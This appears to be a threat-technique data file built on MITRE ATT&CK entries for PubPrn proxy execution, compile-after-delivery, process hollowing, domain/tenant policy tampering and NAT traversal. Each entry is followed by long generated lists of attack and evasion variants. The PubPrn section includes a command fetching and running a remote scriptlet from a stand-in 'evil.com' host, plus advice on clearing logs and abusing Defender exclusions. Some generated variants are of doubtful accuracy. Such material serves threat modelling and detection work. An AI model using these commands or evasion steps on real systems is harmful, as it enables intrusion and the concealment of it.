        PubPrn: Adversaries may use PubPrn to proxy execution of malicious remote files. PubPrn.vbs is a [Visual Basic](https://attack.mitre.org/techniques/T1059/005) script that publishes a printer to Active Directory Domain Services. The script may be signed by Microsoft and is commonly executed through the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) via <code>Cscript.exe</code>. For example, the following code publishes a printer within the specified domain: <code>cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com</code>.(Citation: pubprn)  Adversaries may abuse PubPrn to execute malicious payloads hosted on remote sites.(Citation: Enigma0x3 PubPrn Bypass) To do so, adversaries may set the second <code>script:</code> parameter to reference a scriptlet file (.sct) hosted on a remote site. An example command is <code>pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct</code>. This behavior may bypass signature validation restrictions and application control solutions that do not account for abuse of this script.  In later versions of Windows (10+), <code>PubPrn.vbs</code> has been updated to prevent proxying execution from a remote site. This is done by limiting the protocol specified in the second parameter to <code>LDAP://</code>, vice the <code>script:</code> moniker which could be used to reference remote code via HTTP(S).
          Execute remote SCT file using PubPrn.vbs with command: cscript pubprn.vbs 127.0.0.1 script:http://evil.com/payload.sct
          Host malicious scriptlet file on compromised web server and execute via PubPrn.vbs
          Use local IP address as first parameter to bypass potential network filtering
          Create malformed LDAP path to attempt bypass of Windows 10+ restrictions
          Chain PubPrn execution with other LOLBins to evade detection
          Encode scriptlet URL parameter to bypass security monitoring
          Use HTTPS for payload hosting to blend with legitimate traffic
          Execute PubPrn.vbs through alternate Windows scripting hosts like wscript.exe
          Implement command line argument obfuscation to avoid detection
          Use UNC paths in attempt to bypass local execution restrictions
          Use COM scriptlets in SCT files to execute arbitrary commands while evading detection
          Create scheduled task to periodically execute PubPrn for persistence
          Use DLL payload delivery through SCT files executed by PubPrn
          Implement multi-stage execution where PubPrn downloads additional script components
          Embed PubPrn execution in WMI event subscription
          Use registry run keys to establish PubPrn persistence
          Chain PubPrn with mshta.exe for additional execution options
          Implement PubPrn execution through Group Policy startup scripts
          Use alternate data streams to hide PubPrn and payload scripts
          Execute PubPrn through Windows Management Instrumentation (WMI)
          Use PowerShell to dynamically generate and execute PubPrn commands
          Implement DNS tunneling for PubPrn payload delivery
          Execute PubPrn through Windows Remote Management (WinRM)
          Create shadow copies to hide PubPrn execution artifacts
          Use named pipes for inter-process communication with PubPrn payloads
          Implement PubPrn execution through Windows Task Scheduler API
          Use Windows Error Reporting service to trigger PubPrn execution
          Leverage Windows Defender's excluded paths for PubPrn payload storage
          Execute PubPrn through Microsoft Office macros
          Implement PubPrn execution through Windows Service Control Manager
          Use Group Policy Objects (GPO) to distribute and execute PubPrn across domain
          Clear Windows Event logs before and after PubPrn execution
          Abuse printer spooler service permissions in conjunction with PubPrn
          Execute PubPrn through MSSQL Server xp_cmdshell
          Implement PubPrn execution through Exchange Server transport rules
          Use Windows Credential Guard bypass techniques with PubPrn
          Leverage Azure AD Connect sync to propagate PubPrn execution
          Implement PubPrn through Windows Remote Assistance features
          Use Windows Server Backup to hide PubPrn artifacts
          Execute PubPrn through Microsoft System Center Configuration Manager
      Compile After Delivery: Adversaries may attempt to make payloads difficult to discover and analyze by delivering files to victims as uncompiled code. Similar to [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027), text-based source code files may subvert analysis and scrutiny from protections targeting executables/binaries. These payloads will need to be compiled before execution; typically via native utilities such as csc.exe or GCC/MinGW.(Citation: ClearSky MuddyWater Nov 2018)  Source code payloads may also be encrypted, encoded, and/or embedded within other files, such as those delivered as a [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193). Payloads may also be delivered in formats unrecognizable and inherently benign to the native OS (ex: EXEs on macOS/Linux) before later being (re)compiled into a proper executable binary with a bundled compiler and execution framework.(Citation: TrendMicro WindowsAppMac)
        ~Native Compiler Usage: Adversaries leverage built-in system compilers like csc.exe, gcc, or clang to compile source code after delivery
        ~Cross-Platform Compilation: Delivery of source code that can be compiled on different target platforms using platform-specific compilers
        ~Runtime Compilation: Use of runtime environments (like .NET or Java) to compile code during execution
        ~Embedded Compiler Delivery: Bundling of compiler tools along with the source code payload
        ~Script-Based Compilation: Using scripting languages to manage the compilation process after delivery
        ~Memory-Based Compilation: Compilation of code directly in memory without writing to disk
        ~Container-Based Compilation: Using containerized environments to compile code in isolated contexts
        ~Framework-Specific Compilation: Leveraging application frameworks' compilation features
        ~Multi-Stage Compilation: Breaking the compilation process into multiple stages to evade detection
        ~Just-In-Time Compilation: Using JIT compilation techniques to compile code at runtime
        ~Distributed Compilation: Using remote compilation servers or distributed build systems to compile code
        ~Library-Dependent Compilation: Requiring specific libraries or dependencies to be present for successful compilation
        ~Encrypted Source Compilation: Compilation of encrypted source code that is decrypted just before compilation
        ~Dynamic Language Translation: Converting source code between languages before compilation
        ~Conditional Compilation: Using compilation flags and conditions to generate different outputs based on target environment
        ~Template-Based Compilation: Using code templates that are assembled and compiled on the target system
        ~Interpreter-Assisted Compilation: Using interpreters as an intermediate step in the compilation process
      Process Hollowing: Process hollowing occurs when a process is created in a suspended state then its memory is unmapped and replaced with malicious code. Similar to [Process Injection](https://attack.mitre.org/techniques/T1055), execution of the malicious code is masked under a legitimate process and may evade defenses and detection analysis. (Citation: Leitch Hollowing) (Citation: Elastic Process Injection July 2017)
        ~System Process Hollowing: Hollowing commonly used Windows system processes (like svchost.exe, explorer.exe) to appear legitimate
        ~Custom Process Hollowing: Creating and hollowing custom benign processes chosen by the attacker
        ~PE Image Hollowing: Specifically unmapping and replacing the PE image of the target process
        ~Section Mapping Hollowing: Using section objects to map malicious code into the hollowed process
        ~Remote Thread Hollowing: Combining process hollowing with remote thread creation for execution
        ~API-based Hollowing: Using specific Windows APIs (CreateProcess, NtUnmapViewOfSection, WriteProcessMemory) for hollowing
        ~Direct Memory Hollowing: Directly manipulating process memory structures without using standard APIs
        ~Partial Process Hollowing: Only hollowing specific memory regions while keeping others intact
        ~Multi-Stage Hollowing: Using multiple steps or processes to complete the hollowing operation
        ~Resource-Based Hollowing: Loading malicious code from embedded resources before hollowing
        ~Stack Hollowing: Specifically targeting and replacing the stack region of the process
        ~Suspended Thread Hollowing: Manipulating thread contexts while the process is suspended
        ~Cross-Architecture Hollowing: Hollowing processes across different architecture modes (32/64-bit)
        ~Import Table Hollowing: Modifying the import address table during the hollowing process
        ~Header Hollowing: Specifically manipulating PE headers during the hollowing process
        ~Delayed Hollowing: Performing hollowing operations in stages with time delays
        ~Parent Process Hollowing: Hollowing the parent process instead of creating a new one
        ~Hybrid Hollowing: Combining process hollowing with other injection techniques
      Domain or Tenant Policy Modification: Adversaries may modify the configuration settings of a domain or identity tenant to evade defenses and/or escalate privileges in centrally managed environments. Such services provide a centralized means of managing identity resources such as devices and accounts, and often include configuration settings that may apply between domains or tenants such as trust relationships, identity syncing, or identity federation.  Modifications to domain or tenant settings may include altering domain Group Policy Objects (GPOs) in Microsoft Active Directory (AD) or changing trust settings for domains, including federation trusts relationships between domains or tenants.  With sufficient permissions, adversaries can modify domain or tenant policy settings. Since configuration settings for these services apply to a large number of identity resources, there are a great number of potential attacks malicious outcomes that can stem from this abuse. Examples of such abuse include:    * modifying GPOs to push a malicious [Scheduled Task](https://attack.mitre.org/techniques/T1053/005) to computers throughout the domain environment(Citation: ADSecurity GPO Persistence 2016)(Citation: Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions) * modifying domain trusts to include an adversary-controlled domain, allowing adversaries to  forge access tokens that will subsequently be accepted by victim domain resources(Citation: Microsoft - Customer Guidance on Recent Nation-State Cyber Attacks) * changing configuration settings within the AD environment to implement a [Rogue Domain Controller](https://attack.mitre.org/techniques/T1207). * adding new, adversary-controlled federated identity providers to identity tenants, allowing adversaries to authenticate as any user managed by the victim tenant (Citation: Okta Cross-Tenant Impersonation 2023)  Adversaries may temporarily modify domain or tenant policy, carry out a malicious action(s), and then revert the change to remove suspicious indicators.
        Trust Modification: Adversaries may add new domain trusts, modify the properties of existing domain trusts, or otherwise change the configuration of trust relationships between domains and tenants to evade defenses and/or elevate privileges.Trust details, such as whether or not user identities are federated, allow authentication and authorization properties to apply between domains or tenants for the purpose of accessing shared resources.(Citation: Microsoft - Azure AD Federation) These trust objects may include accounts, credentials, and other authentication material applied to servers, tokens, and domains.  Manipulating these trusts may allow an adversary to escalate privileges and/or evade defenses by modifying settings to add objects which they control. For example, in Microsoft Active Directory (AD) environments, this may be used to forge [SAML Tokens](https://attack.mitre.org/techniques/T1606/002) without the need to compromise the signing certificate to forge new credentials. Instead, an adversary can manipulate domain trusts to add their own signing certificate. An adversary may also convert an AD domain to a federated domain using Active Directory Federation Services (AD FS), which may enable malicious trust modifications such as altering the claim issuance rules to log in any valid set of credentials as a specified user.(Citation: AADInternals zure AD Federated Domain)   An adversary may also add a new federated identity provider to an identity tenant such as Okta or AWS IAM Identity Center, which may enable the adversary to authenticate as any user of the tenant.(Citation: Okta Cross-Tenant Impersonation 2023) This may enable the threat actor to gain broad access into a variety of cloud-based services that leverage the identity tenant. For example, in AWS environments, an adversary that creates a new identity provider for an AWS Organization will be able to federate into all of the AWS Organization member accounts without creating identities for each of the member accounts.(Citation: AWS RE:Inforce Threat Detection 2024)
          Domain Trust Addition: Adding new trust relationships between domains to enable cross-domain access and authentication
          Federation Trust Manipulation: Modifying existing federation trust settings to alter authentication behavior or add malicious identity providers
          Certificate Trust Modification: Adding or modifying certificate trust relationships for authentication and token signing
          Cross-Tenant Trust Configuration: Creating or modifying trust relationships between different cloud tenants
          Trust Property Modification: Altering existing trust relationship properties to change authentication behavior
          Identity Provider Injection: Adding unauthorized identity providers to existing federation configurations
          Trust Chain Manipulation: Modifying the trust chain configuration to include malicious intermediate authorities
          Cloud Service Trust Alteration: Manipulating trust settings specific to cloud service providers
          Authentication Rule Modification: Changing authentication and authorization rules within trust relationships
          Trust Relationship Forwarding: Configuring transitive trust relationships to extend access across multiple domains
        Group Policy Modification: Adversaries may modify Group Policy Objects (GPOs) to subvert the intended discretionary access controls for a domain, usually with the intention of escalating privileges on the domain. Group policy allows for centralized management of user and computer settings in Active Directory (AD). GPOs are containers for group policy settings made up of files stored within a predictable network path `\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\`.(Citation: TechNet Group Policy Basics)(Citation: ADSecurity GPO Persistence 2016)   Like other objects in AD, GPOs have access controls associated with them. By default all user accounts in the domain have permission to read GPOs. It is possible to delegate GPO access control permissions, e.g. write access, to specific users or groups in the domain.  Malicious GPO modifications can be used to implement many other malicious behaviors such as [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001), [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105), [Create Account](https://attack.mitre.org/techniques/T1136), [Service Execution](https://attack.mitre.org/techniques/T1569/002),  and more.(Citation: ADSecurity GPO Persistence 2016)(Citation: Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions)(Citation: Mandiant M Trends 2016)(Citation: Microsoft Hacking Team Breach) Since GPOs can control so many user and machine settings in the AD environment, there are a great number of potential attacks that can stem from this GPO abuse.(Citation: Wald0 Guide to GPOs)  For example, publicly available scripts such as <code>New-GPOImmediateTask</code> can be leveraged to automate the creation of a malicious [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053) by modifying GPO settings, in this case modifying <code>&lt;GPO_PATH&gt;\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml</code>.(Citation: Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions) In some cases an adversary might modify specific user rights like SeEnableDelegationPrivilege, set in <code>&lt;GPO_PATH&gt;\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf</code>, to achieve a subtle AD backdoor with complete control of the domain because the user account under the adversary's control would then be able to modify GPOs.(Citation: Harmj0y SeEnableDelegationPrivilege Right)
          Security Settings Modification: Modifying security-related GPO settings in GptTmpl.inf to alter user rights, security policies, and access controls
          Scheduled Task Creation: Using GPO modifications to create or modify scheduled tasks across domain machines
          Software Installation Policy: Modifying GPO settings to force installation of malicious software across domain computers
          User Preferences Modification: Altering user-specific settings through GPO to implement malicious changes
          Registry Policy Modification: Using GPO to push malicious registry changes across domain machines
          Scripts Policy Modification: Implementing malicious startup, shutdown, logon, or logoff scripts through GPO
          Administrative Template Modification: Altering administrative template settings to disable security features or modify system behavior
          Network Share Mapping: Using GPO to create malicious network share mappings across domain machines
          Printer Configuration: Modifying printer settings via GPO to establish persistence or lateral movement
          Environmental Variable Modification: Using GPO to set malicious environment variables across domain systems
          GPO Permission Delegation: Modifying GPO permissions to maintain persistence and control over policy modifications
          WMI Filter Manipulation: Adding or modifying WMI filters to control GPO application scope
          Site-Level Policy Modification: Targeting GPO changes at specific AD sites for selective policy deployment
          GPO Replication Abuse: Manipulating SYSVOL replication to propagate malicious policies
          Organizational Unit Targeting: Creating or modifying OUs and their GPO links to target specific groups
          GPO Template Manipulation: Modifying or creating custom administrative templates for malicious settings
          Group Policy Central Store Abuse: Manipulating the central store to affect policy definitions across the domain
          GPO Backup/Restore Abuse: Manipulating GPO backups to restore malicious configurations or extract sensitive settings
          Cross-Domain GPO Link Exploitation: Abusing trust relationships to apply malicious GPOs across domain boundaries
          GPO Version Control Manipulation: Modifying GPO version history to hide malicious changes or revert to compromised states
          Credential Policy Modification: Altering password and account policies through GPO to weaken security controls
          Group Policy Caching Abuse: Manipulating cached GPO data on endpoints to maintain persistence
      Network Boundary Bridging: Adversaries may bridge network boundaries by compromising perimeter network devices or internal devices responsible for network segmentation. Breaching these devices may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.  Devices such as routers and firewalls can be used to create boundaries between trusted and untrusted networks.  They achieve this by restricting traffic types to enforce organizational policy in an attempt to reduce the risk inherent in such connections.  Restriction of traffic can be achieved by prohibiting IP addresses, layer 4 protocol ports, or through deep packet inspection to identify applications.  To participate with the rest of the network, these devices can be directly addressable or transparent, but their mode of operation has no bearing on how the adversary can bypass them when compromised.  When an adversary takes control of such a boundary device, they can bypass its policy enforcement to pass normally prohibited traffic across the trust boundary between the two separated networks without hinderance.  By achieving sufficient rights on the device, an adversary can reconfigure the device to allow the traffic they want, allowing them to then further achieve goals such as command and control via [Multi-hop Proxy](https://attack.mitre.org/techniques/T1090/003) or exfiltration of data via [Traffic Duplication](https://attack.mitre.org/techniques/T1020/001). Adversaries may also target internal devices responsible for network segmentation and abuse these in conjunction with [Internal Proxy](https://attack.mitre.org/techniques/T1090/001) to achieve the same goals.(Citation: Kaspersky ThreatNeedle Feb 2021)  In the cases where a border device separates two separate organizations, the adversary can also facilitate lateral movement into new victim environments.
        Network Address Translation Traversal: Adversaries may bridge network boundaries by modifying a network device’s Network Address Translation (NAT) configuration. Malicious modifications to NAT may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.  Network devices such as routers and firewalls that connect multiple networks together may implement NAT during the process of passing packets between networks. When performing NAT, the network device will rewrite the source and/or destination addresses of the IP address header. Some network designs require NAT for the packets to cross the border device.  A typical example of this is environments where internal networks make use of non-Internet routable addresses.(Citation: RFC1918)  When an adversary gains control of a network boundary device, they can either leverage existing NAT configurations to send traffic between two separated networks, or they can implement NAT configurations of their own design.  In the case of network designs that require NAT to function, this enables the adversary to overcome inherent routing limitations that would normally prevent them from accessing protected systems behind the border device.  In the case of network designs that do not require NAT, address translation can be used by adversaries to obscure their activities, as changing the addresses of packets that traverse a network boundary device can make monitoring data transmissions more challenging for defenders.    Adversaries may use [Patch System Image](https://attack.mitre.org/techniques/T1601/001) to change the operating system of a network device, implementing their own custom NAT mechanisms to further obscure their activities
          Modify existing NAT rules on compromised border router to create unauthorized port forwarding entries
          Install custom NAT firmware on network devices to implement covert translation rules
          Create hairpin NAT configurations to enable internal-to-internal routing through external interfaces
          Exploit dynamic NAT overload configurations to hide malicious traffic within legitimate NAT pools
          Implement source NAT (SNAT) rules to masquerade C2 traffic as legitimate internal services
          Configure NAT64/DNS64 translation to tunnel IPv4 traffic through IPv6 networks
          Deploy static NAT mappings to create persistent backdoor access to internal systems
          Modify PAT (Port Address Translation) entries to redirect traffic to attacker-controlled systems
          Implement NAT traversal through VPN concentrators by modifying split-tunnel configurations
          Create NAT reflection rules to bypass internal network segmentation
          Exploit Cisco ASA NAT configuration to create hidden backdoor rules
          Manipulate AWS NAT Gateway configurations to bypass VPC boundaries
          Create NAT loopback rules to enable lateral movement between VLANs
